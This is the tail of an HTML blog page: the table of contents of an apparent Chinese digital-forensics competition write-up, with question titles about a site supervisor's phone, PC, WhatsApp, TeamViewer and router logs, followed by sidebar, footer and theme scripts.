href="#%E9%A2%98%E7%9B%AE4%E5%A4%9A%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84%E6%89%8B%E6%8F%90%E7%94%B5%E8%AF%9D%E4%B8%AD%E4%B8%8B%E5%88%97%E5%93%AA%E4%BA%9B%E6%95%B0%E6%8D%AE%E6%AD%A3%E7%A1%AE%E4%BB%85%E4%B8%A4%E6%AC%A1%E7%AD%94%E9%A2%98%E6%9C%BA%E4%BC%9A"><span class="toc-number">4.4.</span> <span class="toc-text"> 题目4**(多选题)** 工地主管的手提电话中下列哪些数据正确?仅两次答题机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE5%E5%A1%AB%E7%A9%BA%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84%E7%94%B5%E8%AF%9D%E6%9C%80%E5%B8%B8%E4%BD%BF%E7%94%A8%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E4%BB%80%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%9B%9E%E7%AD%94"><span class="toc-number">4.5.</span> <span class="toc-text"> 题目5**(填空题)** 工地主管的电话最常使用的浏览器是什么? (请以英文全大写回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE6%E5%8D%95%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84%E7%94%B5%E8%AF%9D%E8%BF%9E%E6%8E%A5%E8%BF%87%E5%93%AA%E4%B8%80%E4%B8%AAwifi%E4%BB%85%E4%B8%80%E6%AC%A1%E7%AD%94%E9%A2%98%E6%9C%BA%E4%BC%9A"><span class="toc-number">4.6.</span> <span class="toc-text"> 题目6**(单选题)** 工地主管的电话连接过哪一个WiFi?仅一次答题机会</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE7%E5%A4%9A%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E4%B8%8Ealex-chan%E7%9A%84whatsapp-%E5%AF%B9%E8%AF%9D%E4%B8%AD%E6%9B%BE%E6%8F%90%E5%8F%8A%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%AAteamviewer%E7%9A%84%E7%94%A8%E6%88%B7%E5%8F%B7%E7%A0%81"><span class="toc-number">4.7.</span> <span class="toc-text"> 题目7**(多选题)** 工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE8%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84whatsapp%E4%B8%AD%E6%9C%89%E5%A4%9A%E5%B0%91%E4%B8%AA%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%AE%B0%E5%BD%95-%E8%AF%B7%E4%BB%A5%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94"><span class="toc-number">4.8.</span> <span class="toc-text"> 题目8工地主管的WhatsApp中有多少个黑名单的记录? (请以阿拉伯数字回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE9%E5%A4%9A%E9%80%89%E9%A2%98%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%AA%E8%93%9D%E7%89%99%E8%A3%85%E7%BD%AE%E7%9A%84-uuid-%E6%9B%BE%E8%BF%9E%E6%8E%A5%E8%BF%87%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84%E6%89%8B%E6%9C%BA"><span class="toc-number">4.9.</span> <span class="toc-text"> 题目9**(多选题)**以下哪个蓝牙装置的 Uuid 曾连接过工地主管的手机?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE10%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84e%E7%9B%98%E7%9A%84bitlocker%E4%BF%AE%E5%A4%8D%E5%AF%86%E9%92%A5%E6%A0%87%E8%AF%86%E7%AC%A6%E6%98%AF%E7%94%9A%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94%E4%B8%8D%E7%94%A8%E8%BE%93%E5%85%A5-"><span class="toc-number">4.10.</span> <span class="toc-text"> 题目10工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE11%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%85%A7%E7%9A%84ftp%E7%A8%8B%E5%BA%8Ffilezilla%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E7%A7%B0%E6%98%AF%E7%94%9A%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94"><span class="toc-number">4.11.</span> <span class="toc-text"> 题目11工地主管计算机內的FTP程序FileZilla的用户名称是甚么? (请以英文全大写及阿拉伯数字回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE12%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84team-viewer-id-%E6%98%AF%E7%94%9A%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94"><span class="toc-number">4.12.</span> <span class="toc-text"> 题目12工地主管的Team Viewer ID 是甚么? (请以英文全大写及阿拉伯数字回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE13%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E7%9A%84team-viewer%E4%B8%8E%E5%93%AA%E4%B8%80%E4%B8%AAid%E8%BF%9E%E6%8E%A5-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94"><span class="toc-number">4.13.</span> <span class="toc-text"> 题目13工地主管的Team Viewer与哪一个ID连接? (请以英文全大写及阿拉伯数字回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE14%E5%A4%9A%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E6%9B%BE%E7%94%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E6%90%9C%E5%AF%BB%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%80%E4%B8%AA%E5%85%B3%E9%94%AE%E8%AF%8D%E4%BB%96%E6%9B%BE%E7%BB%8F%E6%90%9C%E5%AF%BB"><span class="toc-number">4.14.</span> <span class="toc-text"> 题目14**(多选题)** 工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE15%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BA%A7%E5%93%81%E6%A0%87%E8%AF%86%E7%AC%A6%E6%98%AF%E7%94%9A%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94%E4%B8%8D%E7%94%A8%E8%BE%93%E5%85%A5-"><span class="toc-number">4.15.</span> <span class="toc-text"> 题目15工地主管计算机的Windows系统的产品标识符是甚么? (请以英文全大写及阿拉伯数字回答，不用输入”-“)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE16%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E6%9B%BE%E7%94%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%BF%E7%94%A8whatsapp%E4%BB%96%E6%9B%BE%E5%92%8C%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%AA%E7%94%B5%E8%AF%9D%E5%8F%B7%E7%A0%81%E6%B2%9F%E9%80%9A"><span class="toc-number">4.16.</span> <span class="toc-text"> 题目16工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE17%E5%A4%9A%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E7%A7%B0%E6%98%AF%E7%94%9A%E4%B9%88-%E5%85%B6%E7%94%A8%E6%88%B7%E6%A0%87%E8%AF%86%E7%AC%A6%E6%98%AF%E7%94%9A%E4%B9%88"><span class="toc-number">4.17.</span> <span class="toc-text"> 题目17**(多选题)** 工地主管计算机的用户名称是甚么? 其用户标识符是甚么?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE18%E5%8D%95%E9%80%89%E9%A2%98-%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E9%A2%84%E8%AE%BE%E6%B5%8F%E8%A7%88%E5%99%A8%E6%98%AF%E7%94%9A%E4%B9%88"><span class="toc-number">4.18.</span> <span class="toc-text"> 题目18**(单选题)** 工地主管计算机的预设浏览器是甚么?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE19%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%88%86%E5%8C%BA%E8%A2%AB%E4%BA%BA%E5%8A%A0%E5%AF%86%E5%88%86%E5%8C%BA%E5%86%85%E7%9A%84%E7%94%B5%E5%AD%90%E8%A1%A8%E6%A0%BCmaterial3xlsx%E7%9A%84%E5%93%88%E5%B8%8C%E5%80%BCsha1%E6%98%AF%E7%94%9A%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94"><span class="toc-number">4.19.</span> <span class="toc-text"> 题目19工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的哈希值(SHA1)是甚么? (请以英文全大写及阿拉伯数字回答)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE20%E5%A4%9A%E9%80%89%E9%A2%98-%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E8%AE%B0%E5%BD%95%E4%B8%AD%E6%98%BE%E7%A4%BA%E4%BB%A5%E4%B8%8B%E6%9C%89%E5%93%AA%E4%BA%9Bip%E6%98%AF%E5%85%AC%E5%8F%B8%E7%9A%84%E7%94%B5%E5%AD%90%E5%99%A8%E6%9D%90"><span class="toc-number">4.20.</span> <span class="toc-text"> 题目20**(多选题)** 路由器的记录中显示以下有哪些IP是公司的电子器材?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE21"><span class="toc-number">4.21.</span> <span class="toc-text"> 题目21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE24%E5%8D%95%E9%80%89%E9%A2%98-%E8%B7%AF%E7%94%B1%E5%99%A8%E7%9A%84%E8%AE%B0%E5%BD%95%E4%B8%AD%E6%98%BE%E7%A4%BA%E5%93%AA%E4%B8%80%E4%B8%AAip%E6%9B%BE%E4%BB%A5teamviewer-%E8%BF%9E%E6%8E%A5%E5%85%AC%E5%8F%B8%E8%AE%A1%E7%AE%97%E6%9C%BA"><span class="toc-number">4.22.</span> <span class="toc-text"> 题目24**(单选题)** 路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE27%E5%8D%95%E9%80%89%E9%A2%98-%E9%98%BF%E5%8A%9B%E5%A3%AB-iphone12pro%E7%94%B5%E8%AF%9D%E4%BA%8E2021%E5%B9%B410%E6%9C%8821%E6%97%A5%E4%BB%A5%E4%B8%8B%E5%93%AA%E5%BC%A0%E7%9B%B8%E7%89%87%E5%8F%AF%E8%83%BD%E6%9B%BE%E8%A2%AB%E5%88%86%E4%BA%AButc8"><span class="toc-number">4.23.</span> <span class="toc-text"> 题目27**(单选题)** 阿力士 iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC+8）？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE28%E5%8D%95%E9%80%89-%E9%98%BF%E5%8A%9B%E5%A3%ABiphone-12-pro%E7%94%B5%E8%AF%9D%E4%B8%AD%E5%93%AA%E4%B8%80%E5%BC%A0%E7%9B%B8%E7%89%87%E5%8F%AF%E8%83%BD%E6%9B%BE%E8%A2%AB%E4%BF%AE%E6%94%B9%E6%8B%8D%E6%91%84%E6%97%B6%E9%97%B4"><span class="toc-number">4.24.</span> <span class="toc-text"> 题目28[单选] 阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE29%E5%A1%AB%E7%A9%BA%E9%A2%98-%E9%98%BF%E5%8A%9B%E5%A3%ABiphone-12-pro-%E7%9A%84gsm%E5%AA%92%E4%BD%93%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%9C%B0%E5%9D%80%E6%98%AF%E4%BB%80%E4%B9%88-%E8%AF%B7%E4%BB%A5%E8%8B%B1%E6%96%87%E5%85%A8%E5%A4%A7%E5%86%99%E5%8F%8A%E9%98%BF%E6%8B%89%E4%BC%AF%E6%95%B0%E5%AD%97%E5%9B%9E%E7%AD%94%E4%B8%8D%E7%94%A8%E8%BE%93%E5%85%A5quot"><span class="toc-number">4.25.</span> <span class="toc-text"> 题目29[填空题] 阿力士iPhone 12 pro 的GSM媒体访问控制地址是什么? (请以英文全大写及阿拉伯数字回答，不用输入&quot;😊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE30%E5%8D%95%E9%80%89%E9%A2%98-%E9%98%BF%E5%8A%9B%E5%A3%AB%E7%9A%84iphone-12-pro%E4%BB%A5%E4%BB%80%E4%B9%88%E5%B1%8F%E5%B9%95%E5%AF%86%E7%A0%81%E4%BF%9D%E6%8A%A4"><span class="toc-number">4.26.</span> <span class="toc-text"> 题目30[单选题] 阿力士的iphone 12 pro以什么屏幕密码保护?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE31%E5%A4%9A%E9%80%89%E9%A2%98-%E9%98%BF%E5%8A%9B%E5%A3%ABiphone-12-pro%E5%86%85%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%80%E5%BC%A0%E7%9B%B8%E7%89%87%E6%98%AF%E5%AE%9E%E5%86%B5%E7%9B%B8%E7%89%87live-photos"><span class="toc-number">4.27.</span> <span class="toc-text"> 题目31[多选题] 阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE32%E5%8D%95%E9%80%89%E9%A2%98-%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%80%E4%B8%AA%E6%98%AF%E9%98%BF%E5%8A%9B%E5%A3%ABiphone-12-pro%E5%8F%AF%E8%83%BD%E6%9B%BE%E7%BB%8F%E8%BF%9E%E6%8E%A5%E7%9A%84%E8%A3%85%E7%BD%AE%E5%90%8D%E7%A7%B0"><span class="toc-number">4.28.</span> <span class="toc-text"> 题目32[单选题] 以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE33%E5%8D%95%E9%80%89%E9%A2%98-%E6%8E%A5%E4%B8%8A%E9%A2%98%E8%AE%B0%E5%BD%95%E8%BF%9E%E6%8E%A5%E6%97%B6%E9%97%B4%E6%98%AF%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99utc8"><span class="toc-number">4.29.</span> <span class="toc-text"> 题目33[单选题] 接上题，记录连接时间是什么时候(UTC+8)?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE34%E5%A4%9A%E9%80%89%E9%A2%98-%E9%98%BF%E5%8A%9B%E5%A3%ABiphone-xr%E4%B8%AD%E5%9C%A8%E8%BD%AF%E4%BB%B6whatsapp%E4%B8%AD%E5%B7%A5%E5%9C%B0%E4%B8%BB%E7%AE%A1%E4%B8%8E%E9%98%BF%E5%8A%9B%E5%A3%AB%E7%9A%84%E5%AF%B9%E8%AF%9D%E4%B8%AD%E6%9B%BE%E6%8F%90%E5%88%B0%E4%BD%A2%E5%8F%AB%E6%88%91%E4%BF%BE%E9%92%B1%E5%96%8Ebtc%E4%BF%82%E5%94%94%E4%BF%82%E5%91%A2%E4%B8%AA%E5%95%8A-%E5%9C%A8%E8%BF%9B%E8%A1%8C%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%90%8E%E4%BB%A5%E4%B8%8B%E5%93%AA%E4%B8%80%E4%B8%AA%E6%98%AF%E6%9C%89%E5%8F%AF%E8%83%BD%E5%85%B3%E4%BA%8E%E6%AD%A4%E5%AF%B9%E8%AF%9D%E7%9A%84%E6%AD%A3%E7%A1%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">4.30.</span> <span class="toc-text"> 题目34[多选题] 阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到：[佢叫我俾钱喎，BTC係唔係呢个啊？]。在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述？</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/" title="Windows高级编程1-应用程序的分类和工具">Windows高级编程1-应用程序的分类和工具</a><time datetime="2025-09-16T02:08:56.000Z" title="发表于 2025-09-16 10:08:56">2025-09-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/" title="格理论初探">格理论初探</a><time datetime="2025-09-09T16:19:26.000Z" title="发表于 2025-09-10 00:19:26">2025-09-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/09/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/" title="高等代数-行列式">高等代数-行列式</a><time datetime="2025-09-09T04:52:15.000Z" title="发表于 2025-09-09 12:52:15">2025-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/07/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/5.trick/PWN-trick-exit%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="PWN-trick-exit函数利用">PWN-trick-exit函数利用</a><time datetime="2025-09-07T06:05:08.000Z" title="发表于 2025-09-07 14:05:08">2025-09-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/09/05/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GPNCTF2025%E5%A4%8D%E7%8E%B0/" title="GPNCTF2025复现">GPNCTF2025复现</a><time datetime="2025-09-05T14:35:04.000Z" title="发表于 2025-09-05 22:35:04">2025-09-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By iyheart</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']],
      tags: 'ams'
    },
    chtml: {
      scale: 1.1
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, '']
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typesetPromise()
}</script></div><script src="/zhheo/random.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener
  btf.removeGlobalFnEvent('pjax')
  btf.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>